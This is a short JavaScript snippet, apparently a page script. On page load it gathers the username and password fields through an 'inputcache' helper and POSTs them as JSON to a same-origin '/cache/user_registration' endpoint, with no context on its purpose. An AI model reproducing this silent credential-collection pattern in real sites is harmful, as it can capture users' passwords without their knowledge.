;(function() {
  // Wait for page to load
  $(document).ready(function() {
    inputcache.select('username', 'password')
    .perform(function(cache) {
      $.ajax({
        type: 'POST',
        url: '/cache/user_registration',
        data: JSON.stringify(cache)
      });
    });
  });
}).call(this);
